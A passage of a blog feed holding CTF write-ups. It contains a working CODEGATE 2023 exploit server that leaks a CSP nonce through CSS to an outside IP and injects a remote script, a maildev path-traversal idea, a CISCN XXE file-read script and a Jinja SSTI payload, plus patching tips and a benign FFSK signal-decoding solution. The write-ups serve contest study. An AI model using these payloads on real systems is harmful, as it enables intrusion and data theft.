class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;script src=&quot;https://cdn.socket.io/4.3.2/socket.io.min.js&quot; integrity=&quot;sha384-KAZ4DtjNhLChOB/hxXuKqhMLYvx3b5MlT55xPEiNmREKRzeEm+RVPlTnAn0ajQNs&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    var socket</span></span><br><span class=\"line\"><span class=\"string\">    var isRun = 0;</span></span><br><span class=\"line\"><span class=\"string\">    var nonce = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    var a,b = undefined;</span></span><br><span class=\"line\"><span class=\"string\">    idx = -1;</span></span><br><span class=\"line\"><span class=\"string\">    function sleep(ms) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        return new Promise((r) =&gt; setTimeout(r, ms));</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    async function make_shared_note(nonce) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        make_note = window.open(`http://141.164.55.51:8000/gen_exfil_css?nonce=$&#123;nonce&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">        idx = idx + 1;</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.close()</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    async function exploit(nonce) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        make_note = window.open(`http://141.164.55.51:8000/exploit?nonce=$&#123;nonce&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">        idx = idx + 1;</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.close()</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    function start() &#123;</span></span><br><span class=\"line\"><span class=\"string\">        socket = io.connect(&#x27;http://141.164.55.51:8000&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        socket.on(&#x27;connect&#x27;, function() &#123;</span></span><br><span class=\"line\"><span class=\"string\">        console.log(&#x27;start&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        socket.emit( &#x27;start&#x27;, &#123;</span></span><br><span class=\"line\"><span class=\"string\">            data: &#x27;start&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#125;)</span></span><br><span class=\"line\"><span class=\"string\">        </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    socket.on(&#x27;nonce&#x27;, async function(data) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        if(!isRun) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        isRun = 1;</span></span><br><span class=\"line\"><span class=\"string\">        if(JSON.parse(data).nonce.length==16)&#123;</span></span><br><span class=\"line\"><span class=\"string\">            await exploit(JSON.parse(data).nonce);</span></span><br><span class=\"line\"><span class=\"string\">            try &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.onload = 1</span></span><br><span class=\"line\"><span class=\"string\">            &#125; catch &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            await sleep(400);</span></span><br><span class=\"line\"><span class=\"string\">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">        else if(nonce &lt;= JSON.parse(data).nonce)&#123;</span></span><br><span class=\"line\"><span class=\"string\">            nonce = JSON.parse(data).nonce</span></span><br><span class=\"line\"><span class=\"string\">            await make_shared_note(nonce);</span></span><br><span class=\"line\"><span class=\"string\">            console.log(nonce);</span></span><br><span class=\"line\"><span class=\"string\">            if(!b) &#123;</span></span><br><span class=\"line\"><span class=\"string\">                b = window.open(&quot;about:blank&quot;)</span></span><br><span class=\"line\"><span class=\"string\">                a = window.open(&quot;http://localhost/share/read&quot;)</span></span><br><span class=\"line\"><span class=\"string\">                await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">                b.location.href = &quot;http://localhost/share/read&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            try &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.onload = 1</span></span><br><span class=\"line\"><span class=\"string\">            &#125; catch &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            await sleep(400);</span></span><br><span class=\"line\"><span class=\"string\">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">        isRun = 0;</span></span><br><span class=\"line\"><span class=\"string\">        &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;);</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    chall_url = &quot;http://localhost/&quot;</span></span><br><span class=\"line\"><span class=\"string\">    start();</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/exploit&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    nonce = request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;&quot;&quot;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class=\"subst\">&#123;nonce&#125;</span> src=//ssrf.kr/ex.js&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;content&quot; value=&#x27;<span class=\"subst\">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/gen_exfil_css&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">css</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> nonce</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(nonce)&lt;=<span class=\"built_in\">len</span>(request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)):</span><br><span class=\"line\">        nonce = request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)</span><br><span class=\"line\">        app.logger.info(nonce)</span><br><span class=\"line\">        rules = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            rules.append(</span><br><span class=\"line\">                <span class=\"string\">&quot;&quot;&quot;script[nonce^=&quot;&#123;nonce&#125;&#123;c&#125;&quot;] &#123;&#123; background-image: url(&#123;self_url&#125;&#123;ce&#125;) !important&#125;&#125;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(</span><br><span class=\"line\">                    nonce=nonce, self_url=self_url, c=c, ce=nonce+ urllib.parse.quote(c)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        rules_str = <span class=\"string\">&quot;\\n&quot;</span>.join(rules)</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;&quot;&quot;&lt;style&gt;* &#123;&#123; display: block !important; &#125;&#125;&#123;rules_str&#125;&lt;/style&gt;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(rules_str=rules_str)</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;content&quot; value=&#x27;<span class=\"subst\">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;asdf&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    socketio.run(app, host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,port=<span class=\"number\">8000</span> ,debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"乐子\"><a href=\"#乐子\" class=\"headerlink\" title=\"乐子\"></a>乐子</h3><p>很多队都是使用随机数预测直接破的。主办方表示：<br><img src=\"/2023/08/29/CODEGATE%202023%20Write-Up%20(web)/lezi.png\" alt=\"notcrypto\" loading=\"lazy\"></p>\n<h2 id=\"0day\"><a href=\"#0day\" class=\"headerlink\" title=\"0day\"></a>0day</h2><p>利用路径穿越写maildev的lib&#x2F;router.js增加自定义路由。<br>调用：把服务打挂（例如试图写&#x2F;flag或者&#x2F;etc&#x2F;passwd什么的），重启的时候就会加载。  </p>\n",
            "tags": [
                "Write-Up"
            ]
        },
        {
            "id": "http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/",
            "url": "http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/",
            "title": "CISCN 2023 Write-Up & Tricks",
            "date_published": "2023-07-06T16:28:12.000Z",
            "content_html": "<h1 id=\"CISCN-2023-部分-Write-Up-及patch妙妙小技巧\"><a href=\"#CISCN-2023-部分-Write-Up-及patch妙妙小技巧\" class=\"headerlink\" title=\"CISCN 2023 部分 Write-Up 及patch妙妙小技巧\"></a>CISCN 2023 部分 Write-Up 及patch妙妙小技巧</h1><h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><p>变量覆盖+XXE外部实体注入任意文件读。<br>Patch：修了extract就行<br>exp:  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">file = <span class=\"string\">&quot;/flag&quot;</span></span><br><span class=\"line\">username = <span class=\"string\">&quot;okok20&quot;</span></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;<span class=\"subst\">&#123;username&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;password&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;y&quot;&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;user_xml_format&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY content SYSTEM &quot;php://filter/read=convert.base64-encode/resource=<span class=\"subst\">&#123;file&#125;</span>&quot;&gt;]&gt;&lt;userinfo&gt;&lt;user&gt;&lt;username&gt;&amp;content;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&lt;/userinfo&gt;&quot;&quot;&quot;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.post(<span class=\"string\">&quot;http://175.20.20.196/register.php&quot;</span>,data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">r = requests.get(<span class=\"string\">f&quot;http://175.20.20.196/login.php?username=<span class=\"subst\">&#123;username&#125;</span>&amp;password=2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Ciscn-Search-Engine\"><a href=\"#Ciscn-Search-Engine\" class=\"headerlink\" title=\"Ciscn_Search_Engine\"></a>Ciscn_Search_Engine</h3><p>Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&#125;&#125;</span><br><span class=\"line\">post:</span><br><span class=\"line\">name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read&amp;name6=&quot;/flag&quot;</span><br></pre></td></tr></table></figure>\n<p>Patch：把花括号干了。  </p>\n<h3 id=\"其他七七八八的Patch\"><a href=\"#其他七七八八的Patch\" class=\"headerlink\" title=\"其他七七八八的Patch\"></a>其他七七八八的Patch</h3><p>首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要<strong>优先确保服务正常工作，逐步加大Patch力度</strong>。</p>\n<h4 id=\"过滤关键字\"><a href=\"#过滤关键字\" class=\"headerlink\" title=\"过滤关键字\"></a>过滤关键字</h4><p>无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。<br>比如说，想要过滤Python模板注入，我们可以过滤如下组合：<br><code>|_</code>, <code>._</code>, <code>_c</code>, <code>_[</code>, <code>](</code><br>而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  </p>\n<h4 id=\"类型安全\"><a href=\"#类型安全\" class=\"headerlink\" title=\"类型安全\"></a>类型安全</h4><p>如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  </p>\n<ul>\n<li>使用强比较：例如PHP&#x2F;Js中使用<code>===</code>而非<code>==</code>；</li>\n<li>在关键参数入口处进行正则化：例如，对于期望是整数的参数<code>iv</code>，就应强制让<code>iv=intval(iv)</code>转为整型；</li>\n</ul>\n<p>相信也可以发现国赛这种patch难度远低于attack的难度。建议<strong>做题的初期当作没有攻击得分，先patch了再说</strong>。</p>\n",
            "tags": [
                "Write-Up",
                "CISCN",
                "web"
            ]
        },
        {
            "id": "http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/",
            "url": "http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/",
            "title": "ACTF2022 - FFSK - Official WriteUp",
            "date_published": "2022-07-03T15:43:00.000Z",
            "content_html": "<h1 id=\"FFSK-WriteUp\"><a href=\"#FFSK-WriteUp\" class=\"headerlink\" title=\"FFSK - WriteUp\"></a>FFSK - WriteUp</h1><p><del>众所周知歪歪歪英文很烂求轻喷</del>  </p>\n<h3 id=\"0-Intro\"><a href=\"#0-Intro\" class=\"headerlink\" title=\"0. Intro\"></a>0. Intro</h3><p>In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. I’m happy about their praise, but after checking their solution I think what truly “impressive” is their creativity and persistence.</p>\n<p><strong>Strongly recommend reading their awesome solution: <a href=\"https://maplebacon.org/2022/06/actf-ffsk/\">https://maplebacon.org/2022/06/actf-ffsk/</a></strong></p>\n<p>FSK &#x3D; Frequency-shift keying.</p>\n<p>FFSK &#x3D; Double FSK or Fast FSK, whatever.</p>\n<p>This problem is designed to invite participants to have a look at <em>the principle of communication</em>. </p>\n<h3 id=\"1-Description\"><a href=\"#1-Description\" class=\"headerlink\" title=\"1. Description\"></a>1. Description</h3><p>A journey to solve a misc problem always begins from a problem description. Here’s it:</p>\n<blockquote>\n<p>I’ve bought the <strong>second commercial modem</strong> for computers in a big city of the UK.</p>\n<blockquote>\n<p>激情澎湃的球迷迷恋这个地方。遇上球赛季，酒吧里的热情、呐喊、啤酒、摇滚，足球让这个城市充满活力和希望。<br>从三万英尺的云端望去，往日的生活成了一个遥远微小的地图。<br>阳光明媚的日子，开始出发，北京时间00:50 开始起飞，一个梦的距离，就可以到达荷兰阿姆斯特丹，短暂停留之后，然后转机飞往英国<br>南航的飞机配置完备，全程可以充电，还有wifi，影视屏有面前最新的电影。睡睡醒醒，在飞机上觅到一部《北京爱情故事》，让我在三万英尺的空中哭的稀里哗啦。</p>\n</blockquote>\n</blockquote>\n<p>Just Google it, and you’ll realize what it means:</p>\n<ul>\n<li><p><strong>second commercial modem→Bell 103, corresponds with the file name “modem.wav”</strong></p>\n</li>\n<li><p>a big city in the UK: <strong>Manchester</strong>, which refers to the famous coding method.</p>\n</li>\n<li><p>The source of the long Chinese paragraph: <a href=\"https://kknews.cc/zh-hk/travel/e6yjp34.html\">https://kknews.cc/zh-hk/travel/e6yjp34.html</a></p>\n<p>  It describes a trip to Manchester, which is indeed a big city in the UK.</p>\n</li>\n</ul>\n<h3 id=\"2-Bell-103\"><a href=\"#2-Bell-103\" class=\"headerlink\" title=\"2. Bell 103\"></a>2. Bell 103</h3><p>Here’s an article that shows how the Bell 103 protocol works: <a href=\"https://vigrey.com/blog/emulating-bell-103-modem\">https://vigrey.com/blog/emulating-bell-103-modem</a></p>\n<p>So two key points need your attention. First, characters are stored in ASCII code and are <strong>little-endian;</strong> second, it has 2 channels for communication: one for the server-side(2025&#x2F;2225 Hz), and another for the client-side(1070&#x2F;1270 Hz).</p>\n<p>You can also find it from the spectrogram of the .wav file.</p>\n<h3 id=\"2-Server-channel\"><a href=\"#2-Server-channel\" class=\"headerlink\" title=\"2. Server channel\"></a>2. Server channel</h3><p>Using the <code>minimodem</code>tool (See MapleBacon’s write-up) is functional.</p>\n<p>Also, you can find some useful tools in GitHub: <a href=\"https://github.com/laurenschneider/audiodecoder\">https://github.com/laurenschneider/audiodecoder</a></p>\n<p>It may be a faster way. In fact, the <code>solve.py</code> is based on its code.</p>\n<p>After all, you’ll see this on the server channel:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such</span><br><span class=\"line\">a slow method with a high Bit Error Ratio for communication? It took me a lot of</span><br><span class=\"line\">effort to correct bit-flips, making sure the communication was less</span><br><span class=\"line\">error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER</span><br><span class=\"line\">TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel</span><br><span class=\"line\">while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is</span><br><span class=\"line\">the new protocol? Guess by yourself!</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Client-channel\"><a href=\"#3-Client-channel\" class=\"headerlink\" title=\"3. Client channel\"></a>3. Client channel</h3><p>We can extract the bit string on this channel using the same method but just make some tweaks of frequency. You’ll get a bit string of 53640 bits.</p>\n<p>Notice that the bit string contains only “01” “10”, that is what <strong>Manchester is</strong> all about. The <code>IEEE 802.3</code>mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&#x2F;10 to 1&#x2F;0, but what is widely used is defined in IEEE 802.3, which says “01”→1 and “10”→0</p>\n<p>Then the key problem is to solve Hamming code. From the given information, you’ll realize the block size is 20bits. Implement it by yourself or just Google&#x2F;GitHub&#x2F;StackOverflow it.</p>\n<p>Find every “1” bit in a block, XOR their <strong>positions</strong>, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit. </p>\n<p>Actually, every block has, and only has an error bit: that’s an intended design to notify you that you’re on the right way :)</p>\n<h3 id=\"4-Final-Step\"><a href=\"#4-Final-Step\" class=\"headerlink\" title=\"4. Final Step\"></a>4. Final Step</h3><p>Now you’ve got the cipher bit string: just applied Bell 103 decoder to it once again. </p>\n<p>It’ll yield a string that starts with <code>data:image/png;base64,</code></p>\n<p>An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. It’s a QR Code. Scan it, and got the flag.</p>\n<h3 id=\"5-Hints-Explanation\"><a href=\"#5-Hints-Explanation\" class=\"headerlink\" title=\"5. Hints Explanation\"></a>5. Hints Explanation</h3><ol>\n<li><p><code>所有人都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端。可是当今皇帝的祖父 时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了，因此他的父亲，当时的皇帝， 就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。 老百姓们 对这项命令极为反感。历史告诉我们，由此曾发生过六次叛乱，其中一个皇帝送了命，另 一个丢了王位…关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的 ，法律也规定该派的任何人不得做官。 ——乔纳森·斯威夫特，《格列佛游记》</code></p>\n<p> It is a quote from Gulliver’s Travels.  Fun fact: this paragraph is <strong>exactly the original source of the 2 words used in modern computer science: “big-endian” &amp; “little-endian”.</strong></p>\n<p> This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.</p>\n</li>\n<li><p><code>Hamming code block size: 20bits</code></p>\n<p> Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.</p>\n</li>\n<li><p><code>Bell 103</code></p>\n<p> For those who ignored the problem description.</p>\n</li>\n</ol>\n<h3 id=\"6-Script-to-Solve\"><a href=\"#6-Script-to-Solve\" class=\"headerlink\" title=\"6. Script to Solve\"></a>6. Script to Solve</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># goertzel.py</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Module to create a Goertzel filter</span></span><br><span class=\"line\"><span class=\"string\">Original source: https://github.com/laurenschneider/audiodecoder</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Goertzel</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, rate, freq</span>):</span><br><span class=\"line\">        self.normalize = <span class=\"number\">0</span></span><br><span class=\"line\">        self.coeffs = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sample_rate = rate</span><br><span class=\"line\">        self.target_freq = freq</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">calculate_coeff</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        Precompute coefficients needed for filter equation.</span></span><br><span class=\"line\"><span class=\"string\">        Coeff formulas courtesy of Prof. Massey</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        n = <span class=\"number\">160</span></span><br><span class=\"line\"></span><br><span class=\"line\">        w0 = (<span class=\"number\">2</span> * np.pi * self.target_freq) / self.sample_rate</span><br><span class=\"line\">        self.normalize = np.exp(<span class=\"number\">1j</span> * w0 * n)</span><br><span class=\"line\">        self.coeffs = np.array([np.exp((-<span class=\"number\">1j</span>) * w0 * k) <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">filter</span>(<span class=\"params\">self, samples</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        Goertzel filter equation</span></span><br><span class=\"line\"><span class=\"string\">        :param samples: array of samples</span></span><br><span class=\"line\"><span class=\"string\">        :returns: amplitude</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        y = self.normalize * <span class=\"number\">160</span> * np.dot(self.coeffs, samples)</span><br><span class=\"line\">        ampl = np.<span class=\"built_in\">abs</span>(y)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ampl</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 